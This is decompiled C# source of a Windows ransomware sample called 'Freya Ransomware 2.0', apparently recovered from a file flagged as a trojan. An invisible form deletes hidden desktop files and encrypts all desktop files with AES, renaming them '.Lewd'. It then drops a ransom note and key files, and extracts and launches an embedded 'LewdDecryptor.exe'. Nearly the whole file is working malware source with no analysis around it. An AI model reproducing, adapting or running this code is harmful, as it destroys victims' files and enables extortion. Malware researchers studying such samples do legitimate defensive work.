// Decompiled with JetBrains decompiler
// Type: Freya_Ransomware_2._0.Form1
// Assembly: Freya Ransomware 2.0, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 47191D5B-9D53-4671-BD35-067908824015
// Assembly location: C:\Users\Administrateur\Downloads\HEUR-Trojan.Win32.Generic-8cbb55fca2e9518391c95a2f6307efb895533a20c9f1248a947cda16771c9346.exe

using Freya_Ransomware_2._0.Properties;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Freya_Ransomware_2._0
{
  public class Form1 : Form
  {
    private int filecounter = 0;
    private string hashx = "";
    private string encPath = "C:\\Users\\" + Environment.UserName;
    private string desktoppath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
    private string base64;
    private byte[] bytes;
    private byte[] IV = new byte[16]
    {
      (byte) 1,
      (byte) 2,
      (byte) 3,
      (byte) 4,
      (byte) 5,
      (byte) 6,
      (byte) 7,
      (byte) 8,
      (byte) 9,
      (byte) 10,
      (byte) 11,
      (byte) 12,
      (byte) 13,
      (byte) 14,
      (byte) 15,
      (byte) 16
    };
    private int BlockSize = 128;
    private IContainer components = (IContainer) null;

    public Form1() => this.InitializeComponent();

    protected override CreateParams CreateParams
    {
      get
      {
        CreateParams createParams = base.CreateParams;
        createParams.ExStyle |= 128;
        return createParams;
      }
    }

    private string GetRandom(int lenght)
    {
      string str = "0123456789abcdefghijklmnoprstuvyzABCDEFGHIJKLMNOPRSTUVYZБбВвГгДдЁёЖжЗзИиЙйЛлПпУуФфЦцЧчШшЩщЪъЫыЬьЭэЮюЯяㄱㄲㄴㄷㄸㄹㅁㅂㅃㅅㅆㅇㅈㅉㅊㅋㅌㅍㅎΑΒΓΔΕΖΗΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩβγδεζηθικλμνξοπρσςτυφχψω";
      Random random1 = new Random((int) DateTime.Now.Ticks);
      string random2 = "";
      for (int index = 0; index < lenght; ++index)
      {
        random2 += str[random1.Next(0, str.Length - 1)].ToString();
        this.hashx = random2;
      }
      return random2;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      string location = Assembly.GetExecutingAssembly().Location;
      this.hashx = this.GetRandom(128);
      File.Create("C:\\users\\" + Environment.UserName + "\\Desktop\\Key.txt").Dispose();
      File.WriteAllText("C:\\users\\" + Environment.UserName + "\\Desktop\\Key.txt", this.hashx);
      foreach (string path in Directory.EnumerateFiles(this.desktoppath + "\\").Where<string>((Func<string, bool>) (f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden)).ToArray<string>())
        File.Delete(path);
      try
      {
        foreach (string file in Directory.GetFiles("C:\\Users\\" + Environment.UserName + "\\Desktop\\", " *.* ", SearchOption.AllDirectories))
        {
          ++this.filecounter;
          byte[] buffer = File.ReadAllBytes(file);
          SymmetricAlgorithm symmetricAlgorithm = (SymmetricAlgorithm) Aes.Create();
          HashAlgorithm hashAlgorithm = (HashAlgorithm) MD5.Create();
          symmetricAlgorithm.BlockSize = this.BlockSize;
          symmetricAlgorithm.Key = hashAlgorithm.ComputeHash(Encoding.Unicode.GetBytes(this.hashx));
          symmetricAlgorithm.IV = this.IV;
          using (MemoryStream memoryStream = new MemoryStream())
          {
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, symmetricAlgorithm.CreateEncryptor(), CryptoStreamMode.Write))
              cryptoStream.Write(buffer, 0, buffer.Length);
            File.WriteAllBytes(file, memoryStream.ToArray());
            File.Move(file, file + ".Lewd");
          }
        }
      }
      catch (Exception ex)
      {
      }
      File.Create("C:\\Users\\" + Environment.UserName + "\\Desktop\\ReadMe.txt").Dispose();
      File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Desktop\\ReadMe.txt", "CONTACT ME FROM THİS EMAIL");
      File.Create("C:\\Users\\" + Environment.UserName + "\\Desktop\\YourAttackPath.txt").Dispose();
      File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Desktop\\YourAttackPath.txt", this.encPath);
      File.Create("C:\\Users\\" + Environment.UserName + "\\Desktop\\EncCount.txt").Dispose();
      File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Desktop\\EncCount.txt", Convert.ToString(this.filecounter));
      this.base64 = Resources.Base64;
      this.bytes = Convert.FromBase64String(this.base64);
      File.Create("C:\\Users\\" + Environment.UserName + "\\Desktop\\LewdDecryptor.exe").Dispose();
      File.WriteAllBytes("C:\\Users\\" + Environment.UserName + "\\Desktop\\LewdDecryptor.exe", this.bytes);
      Process.Start("C:\\Users\\" + Environment.UserName + "\\Desktop\\LewdDecryptor.exe");
      Application.Exit();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(800, 450);
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.Text = nameof (Form1);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }
  }
}
